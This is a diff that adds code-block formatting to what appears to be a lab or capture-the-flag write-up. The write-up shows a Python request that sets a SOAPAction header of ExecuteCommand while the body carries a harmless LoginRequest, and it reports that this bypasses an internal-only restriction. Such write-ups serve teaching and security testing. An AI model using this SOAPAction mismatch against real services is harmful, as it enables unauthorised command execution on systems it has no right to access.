@@ -161,6 +161,7 @@ Result: "This function is only allowed in internal networks"
 
 We put a harmless operation (LoginRequest) in the body, but keep the SOAPAction as ExecuteCommand.
 
+```python
 import requests
 
 payload = '''<?xml version="1.0" encoding="utf-8"?>
@@ -173,11 +174,11 @@ payload = '''<?xml version="1.0" encoding="utf-8"?>
   </soap:Body>
 </soap:Envelope>'''
 
-print(requests.post(
+<pre>print(requests.post(
     "http://<TARGET IP>:3002/wsdl",
     data=payload,
     headers={"SOAPAction": '"ExecuteCommand"'}
-).content)
+).content)</pre>
 
 
 Result: Command executed successfully — restriction bypassed.
